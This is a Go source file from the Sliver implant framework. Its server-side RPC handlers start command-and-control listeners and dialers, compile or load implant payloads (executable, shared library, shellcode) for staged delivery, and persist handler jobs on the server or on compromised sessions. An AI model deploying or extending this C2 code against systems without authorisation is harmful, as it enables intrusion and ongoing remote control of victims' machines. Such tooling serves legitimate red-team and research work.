package rpc

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"net"

	"github.com/gofrs/uuid"
	"github.com/sirupsen/logrus"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/c2"
	"github.com/bishopfox/sliver/server/comm"
	"github.com/bishopfox/sliver/server/configs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/db"
	"github.com/bishopfox/sliver/server/db/models"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/server/log"
)

// StartHandlerStage - A generic RPC method used to open handlers for all supported C2 channels, either on the server or on implants.
// Normally no user should have much to do here: if you want to add your C2, check server/c2/listen.go or dial.go.
func (rpc *Server) StartHandlerStage(ctx context.Context, req *clientpb.HandlerStageReq) (res *clientpb.HandlerStage, err error) {

	// Any low level management stuff before anything.
	profile := models.MalleableFromProtobuf(req.Profile)
	session := core.Sessions.Get(req.Request.SessionID)

	// Get a logger for the entire stream
	client := core.Clients.Get(req.Request.ClientID)
	logger := log.ClientLogger(client.ID, "handler")

	// We get the comm.Net interface for the session: if nil,
	// pass 0 and return the server interfaces functions
	var net comm.Net
	if session == nil {
		net, err = comm.ActiveNetwork(0)
		if err != nil {
			return nil, err
		}
	} else {
		net, err = comm.ActiveNetwork(session.ID)
		if err != nil {
			return nil, err
		}
	}

	// Init profile security details: load certificates and keys if any, or default.
	// NOTE: No hostname is passed as argument, as this is a just a listener started,
	// and that if any Cert/Key data is in the profile, this call below will not touch anything.
	//
	// As well, if there are missing elements in the profile, will populate with defaults.
	err = c2.SetupHandlerSecurity(profile, profile.Hostname)
	if err != nil {
		return nil, err
	}

	// A job object that will be used after the listener dialer is started,
	// for saving it into the database or server config if the job is persistent
	job, listener := c2.NewHandlerJob(profile, session)

	// Dispatch the profile to either the root Dialer functions or Listener ones.
	// The actual implementation of the C2 handlers are in there, or possibly in
	// functions still down the way.
	switch profile.Direction {

	// Dialers
	case sliverpb.C2Direction_Bind:
		err = c2.Dial(logger, profile, net, session)
		if err != nil {
			return nil, err
		}

	// Listeners
	case sliverpb.C2Direction_Reverse:
		err = c2.Listen(logger, profile, net, job, listener)
		if err != nil {
			return nil, err
		}
		// If we are here, it means the C2 stack has successfully started
		// (within what can be guaranteed excluding goroutine-based stuff).
		// Assign an order value to this job and register it to the server job & event system.
		c2.InitHandlerJob(job, listener)
	}

	// Save the job if it's marked persistent
	savePersistentJob(profile, job, session)

	return &clientpb.HandlerStage{Response: &commonpb.Response{}, Success: true}, nil
}

// StartHandlerStager - Works the same as StartHandlerStage, except that we listen for connections requiring a stage payload.
func (rpc *Server) StartHandlerStager(ctx context.Context, req *clientpb.HandlerStagerReq) (res *clientpb.HandlerStager, err error) {

	// Any low level management stuff before anything.
	profile := models.MalleableFromProtobuf(req.Profile)
	session := core.Sessions.Get(req.Request.SessionID)

	// Get a logger for the entire stream
	client := core.Clients.Get(req.Request.ClientID)
	logger := log.ClientLogger(client.ID, "handler")

	// We get the comm.Net interface for the session: if nil,
	// pass 0 and return the server interfaces functions
	var net comm.Net
	if session == nil {
		net, err = comm.ActiveNetwork(0)
		if err != nil {
			return nil, err
		}
	} else {
		net, err = comm.ActiveNetwork(session.ID)
		if err != nil {
			return nil, err
		}
	}

	// Init profile security details: load certificates and keys if any, or default.
	// NOTE: No hostname is passed as argument, as this is a just a listener started,
	// and that if any Cert/Key data is in the profile, this call below will not touch anything.
	//
	// As well, if there are nothing in it, it will just load the default
	err = c2.SetupHandlerSecurity(profile, profile.Hostname)
	if err != nil {
		return nil, err
	}

	// A job object that will be used after the listener dialer is started,
	// for saving it into the database or server config if the job is persistent
	job, listener := c2.NewHandlerJob(profile, session)

	// Load the payload stage:
	err = setupStage(req.StageImplant, req.StageBytes, job, logger)

	// Dispatch the profile to either the root Dialer functions or Listener ones.
	// The actual implementation of the C2 handlers are in there, or possibly in
	// functions still down the way.
	switch profile.Direction {

	// Dialers
	case sliverpb.C2Direction_Bind:
		err = c2.Deliver(logger, profile, net, job.StageBytes)
		if err != nil {
			return nil, err
		}

	// Listeners
	case sliverpb.C2Direction_Reverse:
		err = c2.Serve(logger, profile, net, job, listener)
		if err != nil {
			return nil, err
		}

		// If we are here, it means the C2 stack has successfully started
		// (within what can be guaranteed excluding goroutine-based stuff).
		// Assign an order value to this job and register it to the server job & event system.
		c2.InitHandlerJob(job, listener)
	}

	// Save the job if it's marked persistent
	savePersistentJob(profile, job, session)

	return &clientpb.HandlerStager{Response: &commonpb.Response{}, Success: true}, nil
}

// setupStage - Depending on the user-provided elements, fetch and/or load the payload into the job
func setupStage(implantName string, implantBytes []byte, job *core.Job, log *logrus.Entry) (err error) {

	log = log.WithField("component", "stager")

	// if the bytes are given, add conventional name and add bytes to the job below.
	if implantName == "" && len(implantBytes) > 0 {
		job.StageImplant = "foreign"
		job.StageBytes = implantBytes
	}

	// If the implant name is given, load the appropriate bytes
	if implantName != "" && len(implantBytes) == 0 {

		// Use profile by default, and compile based on it
		if profile, err := db.ImplantProfileByName(implantName); err == nil {
			config := profile.ImplantConfig
			var fPath string

			switch config.Format {
			case clientpb.OutputFormat_SERVICE:
				fallthrough
			case clientpb.OutputFormat_EXECUTABLE:
				fPath, err = generate.SliverExecutable(profile.Name, config, log)
				break
			case clientpb.OutputFormat_SHARED_LIB:
				fPath, err = generate.SliverSharedLibrary(profile.Name, config, log)
			case clientpb.OutputFormat_SHELLCODE:
				fPath, err = generate.SliverShellcode(profile.Name, config, log)
			}
			if err != nil {
				return err
			}

			job.StageImplant = profile.Name
			job.StageBytes, err = ioutil.ReadFile(fPath)
			if err != nil {
				return err
			}
		}

		// Or use and already existing implant build
		build, err := db.ImplantBuildByName(implantName)
		if err != nil {
			return fmt.Errorf("failed to find implant build")
		}
		job.StageImplant = build.Name
		job.StageBytes, err = generate.ImplantFileFromBuild(build)
		if err != nil {
			return err
		}
	}

	// Done with the stage compilation
	log = log.WithField("component", "handler")

	return
}

// savePersistentJob - Save a job marked persistent, either for the server or on a session.
func savePersistentJob(profile *models.Malleable, job *core.Job, session *core.Session) (err error) {
	if !profile.Persistent {
		return nil
	}

	// If no session, the job is running on the server
	if session == nil {
		return configs.GetServerConfig().AddHandlerJob(job.ToProtobuf())
	}

	// If session, save the job in the DB, to be spawned the next time the session registers.
	jobSave := &models.Job{
		ID:              job.ID,
		HostID:          uuid.FromStringOrNil(session.HostUUID),
		SessionName:     session.Name,
		SessionUsername: session.Username,
		Name:            job.Name,
		Description:     job.Description,
		Order:           job.Order,
		Profile:         profile,
		StageImplant:    job.StageImplant,
		StageBytes:      job.StageBytes,
	}
	err = db.SessionJobSave(jobSave)

	return
}

// CloseC2Handler - Generic method to close a handler running either on the server or on an implant. By definition these are listeners.
func (rpc *Server) CloseC2Handler(ctx context.Context, req *clientpb.HandlerCloseReq) (res *clientpb.HandlerClose, err error) {
	return nil, status.Errorf(codes.Unimplemented, "method CloseC2Handler not implemented")
}

// checkInterface verifies if an IP address
// is attached to an existing network interface
func checkInterface(a string) bool {
	interfaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, i := range interfaces {
		addresses, err := i.Addrs()
		if err != nil {
			return false
		}
		for _, netAddr := range addresses {
			addr, err := net.ResolveTCPAddr("tcp", netAddr.String())
			if err != nil {
				return false
			}
			if addr.IP.String() == a {
				return true
			}
		}
	}
	return false
}
